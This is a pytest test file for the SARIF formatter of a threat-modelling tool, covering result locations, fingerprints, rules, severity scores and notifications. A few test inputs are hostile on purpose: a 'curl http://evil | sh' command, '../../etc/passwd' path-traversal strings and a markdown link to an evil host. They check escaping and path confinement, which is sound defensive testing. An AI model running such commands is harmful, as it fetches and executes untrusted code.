"""Tests for the SARIF formatter: locations, fingerprints, rules, notifications and attack paths."""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import pytest

from tests.helpers.scan import scan_files
from threatcode.engine.hybrid import HybridEngine
from threatcode.fingerprint import assign_fingerprints, compute_fingerprint
from threatcode.formatters import sarif as sarif_module
from threatcode.formatters._utils import source_uri
from threatcode.formatters.sarif import (
    ATTACK_PATH_RULE,
    FINGERPRINT_KEY,
    LLM_RULE,
    SCHEMA_URL,
    _to_pascal_case,
    format_sarif,
    rule_key,
)
from threatcode.ir.graph import InfraGraph
from threatcode.models.attack_path import AttackHop, AttackPath
from threatcode.models.report import Coverage, ThreatReport
from threatcode.models.threat import Severity, Threat, ThreatSource
from threatcode.parsers.base import ParsedOutput, ParsedResource

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURES = REPO_ROOT / "tests" / "fixtures"


def make_threat(
    *,
    threat_id: str = "t1",
    address: str = "aws_s3_bucket.logs",
    rule_id: str = "R1",
    severity: Severity = Severity.HIGH,
    source: ThreatSource = ThreatSource.RULE,
    file: str = "main.tf",
    line: int | None = 4,
    stride: str = "information_disclosure",
    **fields: Any,
) -> Threat:
    return Threat(
        id=threat_id,
        title=fields.pop("title", f"Title of {rule_id or threat_id}"),
        description=fields.pop("description", "What is wrong."),
        stride_category=stride,
        severity=severity,
        source=source,
        resource_type=fields.pop("resource_type", "aws_s3_bucket"),
        resource_address=address,
        mitigation=fields.pop("mitigation", "Fix it."),
        rule_id=rule_id,
        location_file=file,
        location_start_line=line,
        **fields,
    )


def render(*threats: Threat, **report_fields: Any) -> dict[str, Any]:
    report = ThreatReport(threats=list(threats), input_file="main.tf", **report_fields)
    return json.loads(format_sarif(report))  # type: ignore[no-any-return]


def run_of(*threats: Threat, **report_fields: Any) -> dict[str, Any]:
    return render(*threats, **report_fields)["runs"][0]  # type: ignore[no-any-return]


def rules_by_id(run: dict[str, Any]) -> dict[str, dict[str, Any]]:
    return {r["id"]: r for r in run["tool"]["driver"]["rules"]}


def primary(result: dict[str, Any]) -> dict[str, Any]:
    return result["locations"][0]["physicalLocation"]  # type: ignore[no-any-return]


@pytest.fixture
def at_repo_root(monkeypatch: pytest.MonkeyPatch) -> None:
    """Paths are made relative to the current directory, so the tests fix it."""
    monkeypatch.chdir(REPO_ROOT)


# ---------------------------------------------------------------------------------------
# Document shape
# ---------------------------------------------------------------------------------------


class TestSarifFormatter:
    def test_valid_sarif_structure(self, simple_s3_graph: InfraGraph) -> None:
        report = HybridEngine().analyze(simple_s3_graph)
        sarif = json.loads(format_sarif(report))

        assert sarif["version"] == "2.1.0"
        assert sarif["$schema"] == SCHEMA_URL == "https://json.schemastore.org/sarif-2.1.0.json"
        assert len(sarif["runs"]) == 1

    def test_sarif_has_rules_and_results(self, simple_s3_graph: InfraGraph) -> None:
        report = HybridEngine().analyze(simple_s3_graph)
        run = json.loads(format_sarif(report))["runs"][0]
        assert len(run["tool"]["driver"]["rules"]) > 0
        assert len(run["results"]) > 0

    def test_sarif_result_levels(self, simple_s3_graph: InfraGraph) -> None:
        report = HybridEngine().analyze(simple_s3_graph)
        results = json.loads(format_sarif(report))["runs"][0]["results"]
        assert {r["level"] for r in results}.issubset({"error", "warning", "note"})

    def test_tool_info_carries_a_semantic_version(self) -> None:
        driver = run_of(make_threat(), version="1.2.3")["tool"]["driver"]
        assert driver["name"] == "ThreatCode"
        assert driver["version"] == "1.2.3"
        assert driver["semanticVersion"] == "1.2.3"

    def test_a_report_without_a_version_has_no_semantic_version(self) -> None:
        assert "semanticVersion" not in run_of(make_threat())["tool"]["driver"]

    def test_the_rule_tags_include_stride(self, simple_s3_graph: InfraGraph) -> None:
        report = HybridEngine().analyze(simple_s3_graph)
        rules = json.loads(format_sarif(report))["runs"][0]["tool"]["driver"]["rules"]
        assert rules
        for rule in rules:
            tags = rule["properties"]["tags"]
            if rule["id"] == ATTACK_PATH_RULE:
                # An attack path chains several findings, so it has no single STRIDE category.
                assert "attack-path" in tags
                assert not any(t.startswith("stride/") for t in tags)
            else:
                assert any(t.startswith("stride/") for t in tags)

    def test_the_output_is_deterministic(self) -> None:
        threats = [make_threat(threat_id=f"t{i}", address=f"b{i}") for i in range(5)]
        report = ThreatReport(threats=threats, input_file="main.tf")
        assert format_sarif(report) == format_sarif(report)

    def test_results_are_ordered_most_severe_first(self) -> None:
        run = run_of(
            make_threat(threat_id="a", rule_id="LOW1", severity=Severity.LOW),
            make_threat(threat_id="b", rule_id="CRIT1", severity=Severity.CRITICAL),
            make_threat(threat_id="c", rule_id="MED1", severity=Severity.MEDIUM),
        )
        assert [r["ruleId"] for r in run["results"]] == ["CRIT1", "MED1", "LOW1"]

    def test_the_automation_id_names_the_input(self) -> None:
        assert run_of(make_threat())["automationDetails"]["id"] == "threatcode/main.tf/"

    @pytest.mark.parametrize(
        ("label", "expected"),
        [
            (".", "threatcode/root/"),
            ("", "threatcode/root/"),
            ("a.tf, b.tf", "threatcode/a.tf+b.tf/"),
            ("../evil path/x.tf", "threatcode/evil-path-x.tf/"),
        ],
    )
    def test_the_automation_id_is_safe_for_any_input_label(self, label: str, expected: str) -> None:
        report = ThreatReport(threats=[make_threat()], input_file=label)
        run = json.loads(format_sarif(report))["runs"][0]
        assert run["automationDetails"]["id"] == expected


# ---------------------------------------------------------------------------------------
# Locations
# ---------------------------------------------------------------------------------------


class TestLocations:
    @pytest.mark.parametrize(
        ("fixture", "needs_line"),
        [
            ("terraform/simple.tf", True),
            ("cloudformation/insecure_stack.yml", True),
            ("kubernetes/insecure_deployment.yml", True),
            ("docker/insecure.Dockerfile", True),
            ("terraform/simple_s3.plan.json", True),
        ],
    )
    def test_every_result_points_at_the_scanned_file_with_a_region(
        self, at_repo_root: None, fixture: str, needs_line: bool
    ) -> None:
        scan = scan_files([FIXTURES / fixture])
        run = json.loads(format_sarif(scan.report, scan.graph))["runs"][0]
        expected = f"tests/fixtures/{fixture}"
        assert run["results"]
        for result in run["results"]:
            location = primary(result)
            assert location["artifactLocation"]["uri"] == expected
            assert location["artifactLocation"]["uriBaseId"] == "%SRCROOT%"
            assert location["region"]["startLine"] >= 1

    def test_no_uri_contains_a_resource_address(self, at_repo_root: None) -> None:
        scan = scan_files([FIXTURES / "terraform" / "simple_s3.plan.json"])
        run = json.loads(format_sarif(scan.report, scan.graph))["runs"][0]
        addresses = {t.resource_address for t in scan.report.threats}
        assert addresses
        for result in run["results"]:
            uri = primary(result)["artifactLocation"]["uri"]
            assert not any(a in uri for a in addresses)
            assert "aws_" not in uri

    def test_the_dockerfile_result_carries_the_real_instruction_line(
        self, at_repo_root: None
    ) -> None:
        scan = scan_files([FIXTURES / "docker" / "insecure.Dockerfile"])
        run = json.loads(format_sarif(scan.report, scan.graph))["runs"][0]
        lines = {primary(r)["region"]["startLine"] for r in run["results"]}
        text = (FIXTURES / "docker" / "insecure.Dockerfile").read_text().splitlines()
        assert len(lines) > 1
        assert all(1 <= line <= len(text) for line in lines)
        by_rule = {r["ruleId"]: primary(r)["region"] for r in run["results"]}
        arg_line = by_rule["DOCKER_ARG_SECRET"]["startLine"]
        assert text[arg_line - 1].startswith("ARG ")

    def test_a_hcl_result_has_the_block_range(self, at_repo_root: None) -> None:
        scan = scan_files([FIXTURES / "terraform" / "simple.tf"])
        run = json.loads(format_sarif(scan.report, scan.graph))["runs"][0]
        region = primary(run["results"][0])["region"]
        assert region["endLine"] > region["startLine"]

    def test_the_address_is_a_logical_location_not_a_uri(self) -> None:
        threat = make_threat(address='module.net.aws_instance.web["a b"][0]')
        result = run_of(threat)["results"][0]
        logical = result["locations"][0]["logicalLocations"][0]
        assert logical["fullyQualifiedName"] == 'module.net.aws_instance.web["a b"][0]'
        assert logical["kind"] == "resource"
        assert "web" not in primary(result)["artifactLocation"]["uri"]

    def test_a_threat_without_a_location_falls_back_to_the_input_file_line_one(self) -> None:
        threat = make_threat(file="", line=None, address="aws_s3_bucket.x")
        report = ThreatReport(threats=[threat], input_file="infra/main.tf, other.tf")
        result = json.loads(format_sarif(report))["runs"][0]["results"][0]
        location = primary(result)
        assert location["artifactLocation"]["uri"] == "infra/main.tf"
        assert location["region"] == {"startLine": 1}

    def test_a_threat_without_a_location_uses_its_graph_node(self) -> None:
        graph = InfraGraph.from_parsed(
            ParsedOutput(
                source_path="net/main.tf",
                format_type="terraform_hcl",
                resources=[
                    ParsedResource(
                        resource_type="aws_s3_bucket",
                        name="x",
                        provider="aws",
                        address="aws_s3_bucket.x",
                        properties={},
                        source_location="net/main.tf",
                        start_line=12,
                        end_line=18,
                    )
                ],
            )
        )
        threat = make_threat(file="", line=None, address="aws_s3_bucket.x")
        report = ThreatReport(threats=[threat], input_file="elsewhere.tf")
        result = json.loads(format_sarif(report, graph))["runs"][0]["results"][0]
        assert primary(result)["artifactLocation"]["uri"] == "net/main.tf"
        assert primary(result)["region"] == {"startLine": 12, "endLine": 18}

    def test_the_end_line_is_left_out_when_it_is_before_the_start(self) -> None:
        threat = make_threat(line=9, location_end_line=3)
        assert primary(run_of(threat)["results"][0])["region"] == {"startLine": 9}

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            ("main.tf", "main.tf"),
            ("dir with space/a@b:c.tf", "dir%20with%20space/a%40b%3Ac.tf"),
            ("a\\b\\main.tf", "a/b/main.tf"),
            ("./a/./b//c.tf", "a/b/c.tf"),
            ("../../etc/passwd", "etc/passwd"),
            ("a/../../b.tf", "b.tf"),
            ("100%.tf", "100%25.tf"),
            ("", "."),
            (".", "."),
        ],
    )
    def test_uris_are_relative_percent_encoded_and_cannot_escape(
        self, path: str, expected: str
    ) -> None:
        assert source_uri(path) == expected

    def test_an_encoded_uri_round_trips(self) -> None:
        path = "weird dir/at@sign/colon:name #1.tf"
        assert unquote(source_uri(path)) == path

    def test_an_absolute_path_inside_the_checkout_becomes_relative(
        self, at_repo_root: None
    ) -> None:
        assert source_uri(str(REPO_ROOT / "tests" / "x.tf")) == "tests/x.tf"

    def test_an_absolute_path_outside_the_checkout_is_reduced_to_its_name(
        self, at_repo_root: None
    ) -> None:
        assert source_uri("/somewhere/else/main.tf") == "main.tf"
        assert source_uri("C:\\Users\\me\\main.tf") == "main.tf"

    def test_the_scan_root_prefix_puts_the_file_where_the_repository_has_it(
        self, at_repo_root: None
    ) -> None:
        threat = make_threat(file="main.tf")
        report = ThreatReport(threats=[threat], input_file="infra")
        text = format_sarif(report, source_root=REPO_ROOT / "infra" / "prod")
        assert primary(json.loads(text)["runs"][0]["results"][0])["artifactLocation"]["uri"] == (
            "infra/prod/main.tf"
        )

    def test_a_scan_root_outside_the_checkout_adds_no_prefix(self, at_repo_root: None) -> None:
        report = ThreatReport(threats=[make_threat(file="main.tf")], input_file="x")
        text = format_sarif(report, source_root="/not/under/the/checkout")
        assert primary(json.loads(text)["runs"][0]["results"][0])["artifactLocation"]["uri"] == (
            "main.tf"
        )


# ---------------------------------------------------------------------------------------
# Fingerprints
# ---------------------------------------------------------------------------------------


class TestFingerprints:
    def test_every_result_has_the_fingerprint_of_its_threat(self) -> None:
        threat = make_threat()
        threat.fingerprint = "feedfacecafe0001"
        result = run_of(threat)["results"][0]
        assert result["partialFingerprints"] == {FINGERPRINT_KEY: "feedfacecafe0001"}
        assert FINGERPRINT_KEY == "threatcode/v1"

    def test_a_threat_without_a_fingerprint_gets_the_computed_one(self) -> None:
        threat = make_threat()
        result = run_of(threat)["results"][0]
        assert result["partialFingerprints"][FINGERPRINT_KEY] == compute_fingerprint(threat)
        assert result["partialFingerprints"][FINGERPRINT_KEY]

    def test_for_each_instances_keep_distinct_addresses_and_fingerprints(self) -> None:
        addresses = ['a["prod east"]', 'a["prod-east"]', 'a["prodeast"]']
        threats = [make_threat(threat_id=f"t{i}", address=a) for i, a in enumerate(addresses)]
        assign_fingerprints(threats)
        results = run_of(*threats)["results"]
        names = {r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"] for r in results}
        prints = {r["partialFingerprints"][FINGERPRINT_KEY] for r in results}
        assert names == set(addresses)
        assert len(prints) == 3

    def test_the_same_address_in_two_files_has_two_fingerprints(self) -> None:
        one = make_threat(threat_id="t1", file="a/main.tf")
        two = make_threat(threat_id="t2", file="b/main.tf")
        assign_fingerprints([one, two])
        prints = [r["partialFingerprints"][FINGERPRINT_KEY] for r in run_of(one, two)["results"]]
        assert len(set(prints)) == 2

    def test_fingerprints_are_stable_across_runs_and_line_shifts(self) -> None:
        first = make_threat(line=4)
        second = make_threat(line=40)
        assign_fingerprints([first])
        assign_fingerprints([second])
        before = run_of(first)["results"][0]["partialFingerprints"]
        after = run_of(second)["results"][0]["partialFingerprints"]
        assert before == after

    def test_two_results_that_would_share_a_fingerprint_stay_two_alerts(self) -> None:
        a = make_threat(threat_id="aaaa", address="x")
        b = make_threat(threat_id="bbbb", address="x")
        a.fingerprint = b.fingerprint = "0123456789abcdef"
        prints = [r["partialFingerprints"][FINGERPRINT_KEY] for r in run_of(a, b)["results"]]
        assert len(set(prints)) == 2
        assert all(p.startswith("0123456789abcdef.") for p in prints)

    def test_a_unique_fingerprint_is_never_suffixed(self) -> None:
        a = make_threat(threat_id="aaaa")
        a.fingerprint = "0123456789abcdef"
        assert run_of(a)["results"][0]["partialFingerprints"][FINGERPRINT_KEY] == (
            "0123456789abcdef"
        )


# ---------------------------------------------------------------------------------------
# Rules
# ---------------------------------------------------------------------------------------


def boundary(threat_id: str, src: str, tgt: str, zones: tuple[str, str]) -> Threat:
    return make_threat(
        threat_id=threat_id,
        address=src,
        rule_id="",
        source=ThreatSource.BOUNDARY,
        title=f"Trust boundary crossing: {src} ({zones[0]}) -> {tgt} ({zones[1]})",
        description=f"{src} can reach {tgt}.",
        stride="tampering",
        severity=Severity.HIGH,
        target_address=tgt,
        metadata={
            "boundary_key": f"BOUNDARY_{zones[0]}_{zones[1]}",
            "source_zone": zones[0],
            "target_zone": zones[1],
        },
        mitre_techniques=["T1190"],
    )


def llm_threat(threat_id: str, address: str, mitigation: str = "Do the thing.") -> Threat:
    return make_threat(
        threat_id=threat_id,
        address=address,
        rule_id="",
        source=ThreatSource.LLM,
        title=f"Model finding on {address}",
        description="The model thinks so.",
        mitigation=mitigation,
        severity=Severity.MEDIUM,
        confidence=0.7,
    )


class TestRuleIds:
    def test_boundary_crossings_collapse_to_one_rule_per_zone_pair(self) -> None:
        run = run_of(
            boundary("b1", "lb", "app1", ("internet", "dmz")),
            boundary("b2", "lb", "app2", ("internet", "dmz")),
            boundary("b3", "app1", "db", ("dmz", "data")),
        )
        assert set(rules_by_id(run)) == {
            "THREATCODE_BOUNDARY_INTERNET_DMZ",
            "THREATCODE_BOUNDARY_DMZ_DATA",
        }
        assert [r["ruleId"] for r in run["results"]].count("THREATCODE_BOUNDARY_INTERNET_DMZ") == 2

    def test_a_boundary_rule_description_is_generic_and_the_message_is_specific(self) -> None:
        run = run_of(
            boundary("b1", "lb", "app1", ("internet", "dmz")),
            boundary("b2", "lb", "app2", ("internet", "dmz")),
        )
        rule = rules_by_id(run)["THREATCODE_BOUNDARY_INTERNET_DMZ"]
        assert "app1" not in json.dumps(rule) and "app2" not in json.dumps(rule)
        assert rule["shortDescription"]["text"] == (
            "Trust boundary crossing from the internet zone to the dmz zone"
        )
        messages = [r["message"]["text"] for r in run["results"]]
        assert any("app1" in m for m in messages) and any("app2" in m for m in messages)

    def test_a_boundary_result_relates_to_the_other_end_of_the_flow(self) -> None:
        result = run_of(boundary("b1", "lb", "app1", ("internet", "dmz")))["results"][0]
        related = result["relatedLocations"][0]
        assert related["logicalLocations"][0]["fullyQualifiedName"] == "app1"
        assert related["id"] == 1

    def test_a_boundary_without_zones_still_gets_a_stable_rule(self) -> None:
        threat = boundary("b1", "lb", "app", ("internet", "dmz"))
        threat.metadata = {}
        assert rule_key(threat) == "THREATCODE_BOUNDARY_CROSSING"

    def test_llm_findings_share_one_rule(self) -> None:
        run = run_of(llm_threat("l1", "a"), llm_threat("l2", "b"))
        assert set(rules_by_id(run)) == {LLM_RULE}
        assert LLM_RULE == "THREATCODE_LLM"
        assert len(run["results"]) == 2

    def test_ingested_scanner_findings_are_prefixed_with_the_tool(self) -> None:
        threat = make_threat(
            rule_id="CVE-2024-0001", source=ThreatSource.SCANNER, tool="trivy", evidence="scanner"
        )
        run = run_of(threat)
        assert set(rules_by_id(run)) == {"trivy:CVE-2024-0001"}
        assert run["results"][0]["properties"]["tool"] == "trivy"
        assert run["results"][0]["properties"]["evidence"] == "scanner"

    def test_a_secret_keeps_its_rule_id(self) -> None:
        threat = make_threat(rule_id="SECRET_AWS_KEY", source=ThreatSource.SECRET)
        assert set(rules_by_id(run_of(threat))) == {"SECRET_AWS_KEY"}

    def test_a_rule_without_an_id_falls_back_to_the_threat_id(self) -> None:
        assert rule_key(make_threat(threat_id="abc123", rule_id="")) == "abc123"

    def test_no_rule_id_looks_like_a_per_finding_hash(self) -> None:
        run = run_of(
            boundary("b1", "lb", "app1", ("internet", "dmz")),
            llm_threat("0123456789ab", "a"),
        )
        for rule_id in rules_by_id(run):
            assert not re.fullmatch(r"[0-9a-f]{12}", rule_id)

    def test_rule_ids_are_unique(self) -> None:
        run = run_of(*[make_threat(threat_id=f"t{i}", address=f"a{i}") for i in range(4)])
        ids = [r["id"] for r in run["tool"]["driver"]["rules"]]
        assert len(ids) == len(set(ids)) == 1

    def test_rule_names_are_pascal_case_identifiers(self) -> None:
        for title in (
            "EC2 instance metadata service allows IMDSv1",
            "S3 bucket (public) - read/write!",
            "ünïcode and __odd__ chars",
            "***",
            "",
        ):
            name = _to_pascal_case(title)
            assert re.fullmatch(r"[A-Za-z0-9]+", name), (title, name)
        assert _to_pascal_case("S3 bucket allows public access") == "S3BucketAllowsPublicAccess"
        assert _to_pascal_case("iam role with rds access") == "IAMRoleWithRDSAccess"

    def test_every_rule_name_matches_the_identifier_pattern(self) -> None:
        run = run_of(
            make_threat(title="A (weird) title: with / punctuation"),
            boundary("b1", "lb", "app1", ("internet", "dmz")),
            llm_threat("l1", "a"),
        )
        for rule in run["tool"]["driver"]["rules"]:
            assert re.fullmatch(r"[A-Za-z0-9]+", rule["name"])


class TestSecuritySeverityAndPrecision:
    @pytest.mark.parametrize(
        ("severity", "score"),
        [
            (Severity.CRITICAL, "9.5"),
            (Severity.HIGH, "8.0"),
            (Severity.MEDIUM, "5.5"),
            (Severity.LOW, "3.0"),
        ],
    )
    def test_each_severity_has_a_numeric_score(self, severity: Severity, score: str) -> None:
        rule = rules_by_id(run_of(make_threat(severity=severity)))["R1"]
        assert rule["properties"]["security-severity"] == score
        assert 0.0 < float(score) <= 10.0

    def test_info_has_no_score_and_a_note_level(self) -> None:
        run = run_of(make_threat(severity=Severity.INFO))
        assert "security-severity" not in rules_by_id(run)["R1"]["properties"]
        assert run["results"][0]["level"] == "note"

    def test_critical_and_high_get_different_scores(self) -> None:
        run = run_of(
            make_threat(threat_id="a", rule_id="A", severity=Severity.CRITICAL),
            make_threat(threat_id="b", rule_id="B", severity=Severity.HIGH),
        )
        rules = rules_by_id(run)
        assert (
            rules["A"]["properties"]["security-severity"]
            != rules["B"]["properties"]["security-severity"]
        )

    def test_the_score_follows_the_effective_severity(self) -> None:
        threat = make_threat(
            severity=Severity.MEDIUM,
            effective_severity=Severity.CRITICAL,
            severity_reason="internet reachable data store",
        )
        run = run_of(threat)
        # The rule's own id keeps the findings at its base severity; this one context raised.
        rule = rules_by_id(run)["R1/critical"]
        assert rule["properties"]["security-severity"] == "9.5"
        result = run["results"][0]
        assert result["ruleId"] == "R1/critical"
        assert result["properties"]["security-severity"] == "9.5"
        assert result["level"] == "error"
        assert result["properties"]["severity"] == "critical"
        assert result["properties"]["base_severity"] == "medium"
        assert result["properties"]["severity_reason"] == "internet reachable data store"

    def test_a_rule_takes_the_highest_severity_of_its_results(self) -> None:
        run = run_of(
            make_threat(threat_id="a", address="x", severity=Severity.LOW),
            make_threat(threat_id="b", address="y", severity=Severity.HIGH),
        )
        # Two severities of one rule are two rules, because GitHub ranks by the rule's severity.
        rules = rules_by_id(run)
        assert rules["R1"]["properties"]["security-severity"] == "8.0"
        assert rules["R1"]["defaultConfiguration"]["level"] == "error"
        assert rules["R1/low"]["properties"]["security-severity"] == "3.0"
        assert rules["R1/low"]["defaultConfiguration"]["level"] == "note"
        by_rule = {r["ruleId"]: r["level"] for r in run["results"]}
        assert by_rule == {"R1": "error", "R1/low": "note"}

    @pytest.mark.parametrize(
        ("confidence", "precision"), [(1.0, "high"), (0.7, "medium"), (0.5, "low"), (0.0, "low")]
    )
    def test_precision_follows_the_confidence(self, confidence: float, precision: str) -> None:
        rule = rules_by_id(run_of(make_threat(confidence=confidence)))["R1"]
        assert rule["properties"]["precision"] == precision

    def test_model_suggestions_are_always_low_precision(self) -> None:
        threat = llm_threat("l1", "a")
        threat.confidence = 1.0
        assert rules_by_id(run_of(threat))[LLM_RULE]["properties"]["precision"] == "low"

    def test_the_least_certain_result_decides_the_precision_of_a_rule(self) -> None:
        run = run_of(
            make_threat(threat_id="a", address="x", confidence=1.0),
            make_threat(threat_id="b", address="y", confidence=0.5),
        )
        assert rules_by_id(run)["R1"]["properties"]["precision"] == "low"


class TestTagsAndHelp:
    def test_tags_never_exceed_ten(self) -> None:
        threat = make_threat(
            mitre_techniques=[f"T{1000 + i}" for i in range(12)],
            metadata={
                "cwe": ["CWE-79", "89", 22],
                "owasp": {"mcp_top_10": ["MCP01:2025", "MCP02:2025"], "agentic_top_10": ["ASI03"]},
            },
        )
        tags = rules_by_id(run_of(threat))["R1"]["properties"]["tags"]
        assert len(tags) <= 10
        assert tags[:3] == ["security", "stride/information_disclosure", "source/rule"]

    def test_cwe_ids_become_external_tags(self) -> None:
        threat = make_threat(metadata={"cwe": ["CWE-79", "89", "not-a-cwe", "99999999"]})
        tags = rules_by_id(run_of(threat))["R1"]["properties"]["tags"]
        assert "external/cwe/cwe-79" in tags and "external/cwe/cwe-89" in tags
        assert not any("not-a-cwe" in t or "99999999" in t for t in tags)

    def test_a_rule_unions_the_tags_of_its_results(self) -> None:
        run = run_of(
            make_threat(threat_id="a", address="x", stride="spoofing"),
            make_threat(threat_id="b", address="y", stride="tampering"),
        )
        tags = rules_by_id(run)["R1"]["properties"]["tags"]
        assert "stride/spoofing" in tags and "stride/tampering" in tags

    def test_llm_rules_are_tagged_advisory(self) -> None:
        assert (
            "advisory" in rules_by_id(run_of(llm_threat("l1", "a")))[LLM_RULE]["properties"]["tags"]
        )

    def test_help_markdown_links_the_techniques_and_escapes_the_mitigation(self) -> None:
        threat = make_threat(
            mitigation="Use *less* <b>markup</b> [x](http://evil) @octocat",
            mitre_techniques=["T1530"],
        )
        help_ = rules_by_id(run_of(threat))["R1"]["help"]
        assert "[T1530](https://attack.mitre.org/techniques/T1530/)" in help_["markdown"]
        assert "\\<b>" in help_["markdown"]
        assert "<b>" not in help_["markdown"].replace("\\<b>", "")
        assert "[x](" not in help_["markdown"]
        assert "@octocat" not in help_["markdown"]
        assert help_["text"].startswith("Use *less*")

    def test_an_empty_mitigation_and_no_techniques_omit_help_markdown(self) -> None:
        help_ = rules_by_id(run_of(make_threat(mitigation="")))["R1"]["help"]
        assert "markdown" not in help_
        assert help_["text"] == "See the description."

    def test_an_unknown_technique_is_not_linked(self) -> None:
        threat = make_threat(mitigation="", mitre_techniques=["T9999"])
        assert "markdown" not in rules_by_id(run_of(threat))["R1"]["help"]


# ---------------------------------------------------------------------------------------
# Messages
# ---------------------------------------------------------------------------------------


class TestMessages:
    def test_a_rule_message_is_the_title_and_the_resource_only(self) -> None:
        threat = make_threat(
            title="EC2 instance metadata service allows IMDSv1",
            address="aws_instance.app[0]",
            description="A long explanation that is the same for every instance. " * 20,
        )
        text = run_of(threat)["results"][0]["message"]["text"]
        assert text == "EC2 instance metadata service allows IMDSv1 on aws_instance.app[0]"

    def test_the_explanation_is_in_the_rule_and_not_in_every_result(self) -> None:
        description = "The generic explanation of what is wrong. It is long and general."
        run = run_of(make_threat(description=description))
        assert description in rules_by_id(run)["R1"]["fullDescription"]["text"]
        assert "generic explanation" not in run["results"][0]["message"]["text"]

    def test_the_message_names_no_stride_label_or_property(self) -> None:
        text = run_of(make_threat(stride="information_disclosure"))["results"][0]["message"]["text"]
        assert "Information Disclosure" not in text
        assert "information_disclosure" not in text
        assert "on aws_s3_bucket.logs" in text

    def test_a_title_that_names_the_resource_is_not_followed_by_it_again(self) -> None:
        threat = make_threat(title="Bucket aws_s3_bucket.logs is public")
        text = run_of(threat)["results"][0]["message"]["text"]
        assert text == "Bucket aws_s3_bucket.logs is public"

    def test_the_message_is_one_line(self) -> None:
        threat = make_threat(
            source=ThreatSource.SCANNER,
            tool="trivy",
            title="CVE-1: bad\n\nthing",
            description="Line one.\n\nLine two.\n- item",
        )
        text = run_of(threat)["results"][0]["message"]["text"]
        assert "\n" not in text
        assert text == "CVE-1: bad thing on aws_s3_bucket.logs. Line one."

    def test_an_instance_specific_description_adds_its_first_sentence_only(self) -> None:
        threat = boundary("b1", "lb", "app1", ("internet", "dmz"))
        threat.description = "Traffic from lb to app1 over tcp/443 crosses a boundary. Then more."
        text = run_of(threat)["results"][0]["message"]["text"]
        assert text == "Traffic from lb to app1 over tcp/443 crosses a boundary."

    def test_a_message_is_never_a_wall_of_text(self) -> None:
        threat = make_threat(
            source=ThreatSource.LLM,
            rule_id="",
            title="T" * 900,
            description="D" * 900,
        )
        assert len(run_of(threat)["results"][0]["message"]["text"]) <= 600

    def test_an_llm_message_keeps_the_mitigation_out_of_the_plain_text(self) -> None:
        hostile = "Run `curl http://evil | sh` and ping @octocat\n\n## Heading"
        result = run_of(llm_threat("l1", "a", mitigation=hostile))["results"][0]
        assert "curl" not in result["message"]["text"]
        markdown = result["message"]["markdown"]
        assert "Advisory (LLM)" in markdown
        assert "\\`curl" in markdown
        assert "`curl" not in markdown.replace("\\`curl", "")
        assert "\n## Heading" not in markdown
        assert "@octocat" not in markdown
        assert "`http://evil`" in markdown
        assert "http://evil" not in markdown.replace("`http://evil`", "")

    def test_llm_results_are_tagged_advisory(self) -> None:
        result = run_of(llm_threat("l1", "a"))["results"][0]
        assert result["properties"]["advisory"] is True
        assert result["properties"]["source"] == "llm"

    def test_a_rule_based_result_is_not_marked_advisory(self) -> None:
        assert "advisory" not in run_of(make_threat())["results"][0]["properties"]

    def test_the_root_cause_is_carried_for_consumers_that_group(self) -> None:
        result = run_of(make_threat(root_cause="container-hardening"))["results"][0]
        assert result["properties"]["root_cause"] == "container-hardening"


# ---------------------------------------------------------------------------------------
# Invocation
# ---------------------------------------------------------------------------------------


class TestInvocation:
    def test_a_clean_scan_is_successful_with_no_notifications(self) -> None:
        invocation = run_of(make_threat())["invocations"][0]
        assert invocation == {"executionSuccessful": True, "toolExecutionNotifications": []}

    def test_input_errors_fail_the_invocation(self) -> None:
        coverage = Coverage(
            errors=[{"file": "bad.tf", "code": "parse.failed", "message": "unexpected token"}]
        )
        invocation = run_of(make_threat(), coverage=coverage)["invocations"][0]
        assert invocation["executionSuccessful"] is False
        note = invocation["toolExecutionNotifications"][0]
        assert note["level"] == "error"
        assert note["descriptor"] == {"id": "parse.failed"}
        assert "unexpected token" in note["message"]["text"]
        assert note["locations"][0]["physicalLocation"]["artifactLocation"]["uri"] == "bad.tf"

    def test_gaps_are_warnings_that_keep_the_invocation_successful(self) -> None:
        coverage = Coverage(
            gaps=[
                {
                    "level": "warning",
                    "code": "hcl.module_call_skipped",
                    "message": "module vpc not analysed",
                    "file": "main.tf",
                    "line": 7,
                },
                {"level": "info", "code": "plan.unknown_values", "message": "3 unknown"},
            ]
        )
        invocation = run_of(make_threat(), coverage=coverage)["invocations"][0]
        assert invocation["executionSuccessful"] is True
        first, second = invocation["toolExecutionNotifications"]
        assert first["level"] == "warning"
        assert first["locations"][0]["physicalLocation"]["region"]["startLine"] == 7
        assert second["level"] == "note" and "locations" not in second

    def test_failed_rules_fail_the_invocation(self) -> None:
        invocation = run_of(make_threat(), coverage=Coverage(rule_errors=2))["invocations"][0]
        assert invocation["executionSuccessful"] is False
        assert invocation["toolExecutionNotifications"][0]["descriptor"]["id"] == "rules.failed"

    def test_an_llm_failure_is_a_warning_notification_and_fails_the_invocation(self) -> None:
        llm = {"provider": "anthropic", "model": "m", "status": "failed", "error": "timed out"}
        invocation = run_of(make_threat(), llm=llm)["invocations"][0]
        assert invocation["executionSuccessful"] is False
        note = invocation["toolExecutionNotifications"][0]
        assert note["level"] == "warning"
        assert note["descriptor"]["id"] == "llm.failed"
        assert "timed out" in note["message"]["text"]

    def test_a_skipped_llm_phase_adds_nothing_and_a_finished_one_only_its_note(self) -> None:
        skipped = run_of(make_threat(), llm={"status": "skipped"})["invocations"][0]
        assert skipped["executionSuccessful"] is True
        assert skipped["toolExecutionNotifications"] == []
        ran = run_of(make_threat(), llm={"status": "ran"})["invocations"][0]
        assert ran["executionSuccessful"] is True
        assert [n["descriptor"]["id"] for n in ran["toolExecutionNotifications"]] == ["llm.ran"]

    def test_notifications_are_capped(self) -> None:
        gaps = [{"level": "warning", "code": "g", "message": f"gap {i}"} for i in range(250)]
        invocation = run_of(make_threat(), coverage=Coverage(gaps=gaps))["invocations"][0]
        notes = invocation["toolExecutionNotifications"]
        assert len(notes) == sarif_module.MAX_NOTIFICATIONS + 1
        assert notes[-1]["message"]["text"] == "50 more notification(s) omitted"

    def test_results_beyond_the_github_limit_are_dropped_with_a_notice(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(sarif_module, "MAX_RESULTS", 2)
        threats = [make_threat(threat_id=f"t{i}", address=f"x{i}") for i in range(5)]
        run = run_of(*threats)
        assert len(run["results"]) == 2
